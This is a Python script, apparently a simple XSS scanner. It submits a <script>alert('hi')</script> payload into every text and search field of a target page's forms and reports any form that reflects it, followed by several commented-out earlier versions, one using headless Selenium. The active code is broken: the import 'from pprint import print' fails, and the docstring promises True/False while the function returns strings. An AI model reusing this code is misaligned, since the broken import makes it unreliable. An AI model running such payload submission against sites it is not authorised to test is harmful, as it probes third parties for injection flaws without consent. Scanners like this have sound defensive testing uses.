#Proper XSS testing
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from pprint import print

def scan_xss(url):
    """
    Given a `url`, it prints all XSS vulnerable forms and
    returns True if any is vulnerable, False otherwise
    """
    # Get the HTML content of the URL
    response = requests.get(url)
    if response.status_code != 200:
        print(f"[-] Error: Unable to fetch URL {url}")
        return "Unable to fetch URL"

    soup = BeautifulSoup(response.content, "html.parser")

    # Find all form elements in the HTML
    forms = soup.find_all("form")
    print(f"[+] Detected {len(forms)} forms on {url}.")

    js_script = "<script>alert('hi')</script>"  # Fixed typo in script tag

    # Initialize a variable to track whether any form is vulnerable
    is_vulnerable = False

    # Iterate over all forms
    for form in forms:
        # Extract form details
        action = form.get("action", "").lower()
        method = form.get("method", "get").lower()
        inputs = []

        for input_tag in form.find_all("input"):
            input_type = input_tag.get("type", "text")
            input_name = input_tag.get("name")
            inputs.append({"type": input_type, "name": input_name})

        # Construct the full URL (if the action is relative)
        target_url = urljoin(url, action)

        # Prepare form data
        data = {}
        for input_data in inputs:
            if input_data["type"] in ["text", "search"]:
                data[input_data["name"]] = js_script

        print(f"[+] Submitting malicious payload to {target_url}")
        print(f"[+] Data: {data}")

        # Perform the form submission
        if method == "post":
            response = requests.post(target_url, data=data)
        else:
            # GET request
            response = requests.get(target_url, params=data)

        # Check if the response contains our JavaScript payload
        if js_script in response.text:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            print(f"  Action: {action}")
            print(f"  Method: {method}")
            print(f"  Inputs: {inputs}")
            is_vulnerable = True
            # Don't break because we want to print available vulnerable forms

    if not is_vulnerable:
        print("No XSS Found on Target")
    return "XSS Found in Form" if is_vulnerable else "No XSS Found on Target"

def getVulnerabilities(url):
    return scan_xss(url)

# def get_all_forms(url):
#     """Given a `url`, it returns all forms from the HTML content"""
#     soup = BeautifulSoup(requests.get(url).content, "html.parser")
#     print(soup.find_all())
#     return soup.find_all()

# def get_form_details(form):
#     """
#     This function extracts all possible useful information about an HTML `form`
#     """
#     details = {}
#     # Get the form action (target URL)
#     action = form.attrs.get("action", "").lower()
#     # Get the form method (POST, GET, etc.)
#     method = form.attrs.get("method", "get").lower()
#     # Get all the input details such as type and name
#     inputs = []
#     for input_tag in form.find_all("input"):
#         input_type = input_tag.attrs.get("type", "text")
#         input_name = input_tag.attrs.get("name")
#         inputs.append({"type": input_type, "name": input_name})
#     # Put everything into the resulting dictionary
#     details["action"] = action
#     details["method"] = method
#     details["inputs"] = inputs
#     return details

# def submit_form(form_details, url, value):
#     """
#     Submits a form given in `form_details`
#     Params:
#         form_details (dict): a dictionary containing form information
#         url (str): the original URL that contains that form
#         value (str): this will be replaced with all text and search inputs
#     Returns the HTTP Response after form submission
#     """
#     # Construct the full URL (if the URL provided in action is relative)
#     target_url = urljoin(url, form_details["action"])
#     # Get the inputs
#     inputs = form_details["inputs"]
#     data = {}
#     for input in inputs:
#         # Replace all text and search values with `value`
#         if input["type"] == "text" or input["type"] == "search":
#             input["value"] = value
#         input_name = input.get("name")
#         input_value = input.get("value")
#         if input_name and input_value:
#             # If input name and value are not None,
#             # then add them to the data of form submission
#             data[input_name] = input_value

#     print(f"[+] Submitting malicious payload to {target_url}")
#     print(f"[+] Data: {data}")
#     if form_details["method"] == "post":
#         return requests.post(target_url, data=data)
#     else:
#         # GET request
#         return requests.get(target_url, params=data)

# def scan_xss(url):
#     """
#     Given a `url`, it prints all XSS vulnerable forms and
#     returns True if any is vulnerable, False otherwise
#     """
#     # Get all the forms from the URL
#     forms = get_all_forms(url)
#     print(f"[+] Detected {len(forms)} forms on {url}.")
#     js_script = "<Script>alert('hi')</scripT>"
#     # Returning value
#     is_vulnerable = False
#     # Iterate over all forms
#     for form in forms:
#         form_details = get_form_details(form)
#         content = submit_form(form_details, url, js_script).content.decode()
#         if js_script in content:
#             print(f"[+] XSS Detected on {url}")
#             print(f"[*] Form details:")
#             pprint(form_details)
#             is_vulnerable = True
#             break
#             # Don't break because we want to print available vulnerable forms
#     if is_vulnerable:
#         form_details="XSS Found in Form - ",form_details
#     else:
#         form_details = "No XSS Found on Target"
#     return form_details


# def getVulnerabilities(url):
#     return scan_xss(url)



# import requests
# from bs4 import BeautifulSoup
# from urllib.parse import urljoin
# from pprint import pprint
# from selenium import webdriver

# # Set up the Chrome driver
# options = webdriver.ChromeOptions()
# options.add_argument('--headless')  # Run Chrome in headless mode
# driver = webdriver.Chrome(options=options)

# def get_all_forms(url):
#     #soup = BeautifulSoup(requests.get(url).content, "html.parser")
#     """Given a `url`, it returns all forms from the HTML content"""
#     # Navigate to the desired URL
#     driver.get(url)
#     # # Get the page source
#     page_source = driver.page_source
#     # # Close the driver
#     driver.quit()
#     # Parse the page source with BeautifulSoup
    
#     soup = BeautifulSoup(page_source, 'html.parser')
#     print(soup)
#     return soup.find_all("form")

# def get_form_details(form):
#     """
#     This function extracts all possible useful information about an HTML `form`
#     """
#     details = {}
#     # Get the form action (target URL)
#     action = form.attrs.get("action", "").lower()
#     # Get the form method (POST, GET, etc.)
#     method = form.attrs.get("method", "get").lower()
#     # Get all the input details such as type and name
#     inputs = []
#     for input_tag in form.find_all("input"):
#         input_type = input_tag.attrs.get("type", "text")
#         input_name = input_tag.attrs.get("name")
#         inputs.append({"type": input_type, "name": input_name})
#     # Put everything into the resulting dictionary
#     details["action"] = action
#     details["method"] = method
#     details["inputs"] = inputs
#     return details

# def submit_form(form_details, url, value):
#     """
#     Submits a form given in `form_details`
#     Params:
#         form_details (dict): a dictionary containing form information
#         url (str): the original URL that contains that form
#         value (str): this will be replaced with all text and search inputs
#     Returns the HTTP Response after form submission
#     """
#     # Construct the full URL (if the URL provided in action is relative)
#     target_url = urljoin(url, form_details["action"])
#     # Get the inputs
#     inputs = form_details["inputs"]
#     data = {}
#     for input in inputs:
#         # Replace all text and search values with `value`
#         if input["type"] == "text" or input["type"] == "search":
#             input["value"] = value
#         input_name = input.get("name")
#         input_value = input.get("value")
#         if input_name and input_value:
#             # If input name and value are not None,
#             # then add them to the data of form submission
#             data[input_name] = input_value

#     print(f"[+] Submitting malicious payload to {target_url}")
#     print(f"[+] Data: {data}")
#     if form_details["method"] == "post":
#         return requests.post(target_url, data=data)
#     else:
#         # GET request
#         return requests.get(target_url, params=data)

# def scan_xss(url):
#     """
#     Given a `url`, it prints all XSS vulnerable forms and
#     returns True if any is vulnerable, False otherwise
#     """
#     # Get all the forms from the URL
#     forms = get_all_forms(url)
#     print(f"[+] Detected {len(forms)} forms on {url}.")
#     js_script = "<Script>alert('hi')</scripT>"
#     # Returning value
#     is_vulnerable = False
#     # Iterate over all forms
#     for form in forms:
#         form_details = get_form_details(form)
#         content = submit_form(form_details, url, js_script).content.decode()
#         if js_script in content:
#             print(f"[+] XSS Detected on {url}")
#             print(f"[*] Form details:")
#             pprint(form_details)
#             is_vulnerable = True
#             # Don't break because we want to print available vulnerable forms
#     return is_vulnerable

# def getVulnerabilities(url):
#     scan_xss(url)
#     return "Success"

